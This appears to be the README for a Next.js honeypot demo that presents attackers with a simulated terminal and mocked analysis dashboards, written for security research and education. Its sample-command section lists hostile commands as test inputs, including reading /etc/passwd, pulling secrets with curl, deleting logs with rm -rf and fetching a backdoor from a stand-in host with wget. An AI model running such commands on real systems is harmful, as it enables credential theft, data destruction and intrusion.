# GhostShell - Agentic AI Honeypot System

A Next.js demonstration of an intelligent honeypot security platform that silently captures and analyzes attacker behavior.

## 🎯 What is GhostShell?

GhostShell is a research platform that:
- **Detects** abnormal authentication attempts (console-based login bypass)
- **Engages** suspicious users in a realistic fake terminal environment
- **Analyzes** attacker behavior without alerting them
- **Logs** everything for security intelligence

This is a **deception system**, not a real hacking tool. It's designed to study attacker behavior safely.

## 🏗️ Architecture

```
User (Attacker)
    ↓
Company Login Page (Entry Layer)
    ↓
Bypass Detection Engine
    ↓
Honeypot Redirection
    ↓
Fake Terminal (Simulated)
    ↓
Agentic Analysis Engine (Mock)
    ↓
Admin Dashboard + Logs
```

## 📦 What's Included in This Demo

### 1. **Authentication Interface** (`/`)
- Normal login form
- Console-based "Advanced Access" option
- Appears as legitimate company system
- Detects console bypass attempts

### 2. **Simulated Terminal** (`/terminal`)
- Realistic Linux-like command prompt
- Pre-configured responses to common hacking commands:
  - `whoami`, `id`, `pwd` - System info
  - `sudo -l`, `sudo su` - Privilege escalation
  - `cat /etc/passwd` - Credential access
  - `nmap`, `curl`, `wget` - Reconnaissance
  - `rm -rf` - Destructive commands
- Command history with arrow key navigation
- Silent monitoring and logging

### 3. **Admin Dashboard** (`/admin`)
- Real-time metrics overview
- Risk distribution pie chart
- 24-hour attack timeline
- Threat classification breakdown
- Quick actions panel
- Links to detailed session monitoring

### 4. **Live Sessions View** (`/admin/sessions`)
- All active and historical honeypot sessions
- Each session shows:
  - Risk score and threat level
  - Entry vector (console, API, debug, etc.)
  - Attack stage progression
  - Duration and command count
  - Behavior classification tags
  - Deception strategies deployed

### 5. **Session Detail View** (`/admin/sessions/:sessionId`)
- Deep dive into individual attack sessions
- Risk score progression chart
- Complete command transcript with:
  - Threat classification for each command
  - Risk increase per action
  - Simulated command output
- Behavior classification tags
- Deception strategies used
- Timeline of session events

## 🚀 Getting Started

### Prerequisites
- Node.js 16+ 
- npm or yarn

### Installation

```bash
# Install dependencies
npm install
# or
yarn install
```

### Running the Demo

```bash
# Start development server
npm run dev
# or
yarn dev
```

The app will be available at `http://localhost:3000`

### Building for Production

```bash
npm run build
npm start
```

## 🎬 Demo Flow

### For Security Researchers:
1. Visit `/admin` to see the security dashboard
2. Check real-time metrics and threat distribution
3. Navigate to live sessions to monitor attackers
4. Click on a session to see detailed analysis
5. Review command transcripts and behavior patterns

### For Attackers (Simulated):
1. Go to home page (`/`)
2. Try "Console Access" tab (triggers detection)
3. Execute various commands (no real execution)
4. Check what security teams see (invisible to you)

## 📊 Mock Data Overview

The demo includes **4 sample sessions**:

| Session | Risk | Status | Attack Stage | Threat Level |
|---------|------|--------|--------------|--------------|
| session-001 | 85 | Active | Escalation | HIGH |
| session-002 | 45 | Active | Reconnaissance | MEDIUM |
| session-003 | 120 | Ended | Persistence | CRITICAL |
| session-004 | 32 | Active | Initial Access | LOW |

### Command Categories Tracked:
- **Reconnaissance**: Information gathering (ls, ps, nmap)
- **Credential Access**: Harvesting secrets (cat /etc/passwd, curl APIs)
- **Privilege Escalation**: Gaining elevated access (sudo -l, sudo su)
- **Persistence**: Installing backdoors (wget, shell scripts)
- **Destructive**: Data destruction (rm -rf)

## 🔧 Tech Stack

- **Framework**: Next.js 16+ with App Router
- **UI**: React 19 + Tailwind CSS
- **Charts**: Recharts
- **Icons**: Lucide React
- **Language**: TypeScript
- **Styling**: Dark theme optimized for security ops

## 📁 Project Structure

```
app/
├── page.tsx              # Home/Auth page
├── layout.tsx            # Root layout
├── globals.css           # Tailwind styles
├── terminal/
│   └── page.tsx         # Simulated terminal interface
└── admin/
    ├── page.tsx         # Dashboard overview
    └── sessions/
        ├── page.tsx     # Live sessions list
        └── [sessionId]/
            └── page.tsx # Session detail view

lib/
├── types.ts             # TypeScript definitions
└── mock-data.ts         # Mock sessions and helper functions
```

## 🎨 Key Features

### Admin Dashboard Highlights:
- **Live Metrics**: Total attackers, active sessions, commands tracked
- **Risk Distribution**: Pie chart showing threat level breakdown
- **Attack Timeline**: 24-hour visualization of attack frequency
- **Threat Classification**: Breakdown by MITRE ATT&CK categories

### Session Analysis:
- **Risk Progression**: Line chart showing score increase per command
- **Behavior Classification**: Tags like "Script Kiddie", "Advanced Attacker"
- **Deception Strategies**: Shows which deception tactics were used
- **Command Transcript**: Full audit trail with threat levels and risk scores

## 🔐 Security Notes

- ✅ No real authentication bypass
- ✅ No actual command execution
- ✅ All data is static/mocked
- ✅ Safe for demonstrations
- ✅ Educational purposes only

## 🎓 Learning Resources

This demo illustrates:
- Honeypot architecture and design
- Threat intelligence collection
- Attack pattern analysis
- Security metrics visualization
- User behavioral analysis

## 📝 Sample Commands to Try

In the terminal, try these commands:

```bash
whoami                              # Basic info
sudo -l                            # Privilege check
cat /etc/passwd                    # Credential access
nmap -sV localhost                 # Reconnaissance
curl http://internal-api:8080/secrets  # API exfiltration
rm -rf /var/log                    # Log destruction
wget http://malicious.com/backdoor # Backdoor attempt
ps aux                             # Process analysis
```

Each command triggers different threat classifications and risk scores!

## 🚀 Deployment

The app is production-ready and can be deployed to:
- **Vercel** (recommended, optimized for Next.js)
- **AWS Amplify**
- **Heroku**
- **Docker**
- Any Node.js hosting

### Deploy to Vercel (One Click):
```bash
vercel deploy
```

## 📄 License

This is a research/educational project. Use responsibly.

## 💡 Future Enhancements

- Real WebSocket support for live updates
- AI-powered threat analysis
- Integration with real security tools
- Database persistence
- User authentication for admin panel
- Export/Report generation
- API integration points

---

**Note**: This is a simulation and demonstration platform. All attackers and sessions are fictional. For real honeypot deployments, use production-grade solutions like Cowrie, Dionaea, or commercial platforms.
